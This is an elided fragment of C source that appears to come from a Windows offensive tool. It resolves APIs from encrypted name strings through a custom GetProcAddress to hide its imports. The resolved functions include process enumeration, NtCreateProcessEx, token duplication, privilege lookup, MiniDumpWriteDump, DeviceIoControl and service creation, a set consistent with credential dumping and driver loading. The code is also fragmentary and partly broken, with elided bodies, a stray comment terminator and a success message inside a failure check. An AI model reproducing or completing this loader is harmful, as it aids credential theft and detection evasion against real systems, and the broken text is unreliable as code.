...
static BOOL ResolveApiFromDll(HMODULE hMod, const unsigned char *enc,
                              size_t len, void **fn) {
  ...
  *fn = (void *)CustomGetProcAddress(hMod, name);
  ...
  if (*fn == NULL) {
      ...
      log_info("Successfully resolved API '%s' from module %p at address %p",
  name, hMod, *fn);
  }
  */
  custom_free(name);
...
BOOL ResolveAllApis(void) {
  ...
  if (!ResolveApiFromDll(hKernel32, P32F_ENC, sizeof(P32F_ENC),
                         (void **)&pP32F)) {
    // log_error("Failed to resolve Process32First");
    ok = FALSE;
  }
  if (!ResolveApiFromDll(hKernel32, P32N_ENC, sizeof(P32N_ENC),
                         (void **)&pP32N)) {
  ...
  if (!ResolveApiFromDll(hNtdll, NTCPE_ENC, sizeof(NTCPE_ENC),
                         (void **)&pNTCPX)) {
  ...
  if (!ResolveApiFromDll(hAdvapi32, OPTK_ENC, sizeof(OPTK_ENC),
                         (void **)&pOPTK)) {
    // log_error("Failed to resolve OpenProcessToken");
    ok = FALSE;
  }
  if (!ResolveApiFromDll(hAdvapi32, DUPTOK_ENC, sizeof(DUPTOK_ENC),
                         (void **)&pDUPTOK)) {
  ...
  if (!ResolveApiFromDll(hAdvapi32, LPVA_ENC, sizeof(LPVA_ENC),
                         (void **)&pLPVA)) {
    // log_error("Failed to resolve LookupPrivilegeValueA");
    ok = FALSE;
  }
  if (!ResolveApiFromDll(hDbghelp, MDWD_ENC, sizeof(MDWD_ENC),
                         (void **)&pMDWD)) {
    // log_error("Failed to resolve MiniDumpWriteDump");
    ok = FALSE;
  }
  if (!ResolveApiFromDll(hKernel32, GPID_ENC, sizeof(GPID_ENC),
                         (void **)&pGPID)) {
  ...
  if (!ResolveApiFromDll(hKernel32, DIOC_ENC, sizeof(DIOC_ENC),
                         (void **)&pDIOC)) {
  ...
  if (!ResolveApiFromDll(hAdvapi32, OSCM_ENC, sizeof(OSCM_ENC),
                         (void **)&pOSCM)) {
  ...
  if (!ResolveApiFromDll(hAdvapi32, CSVC_ENC, sizeof(CSVC_ENC),
                         (void **)&pCSVC)) {
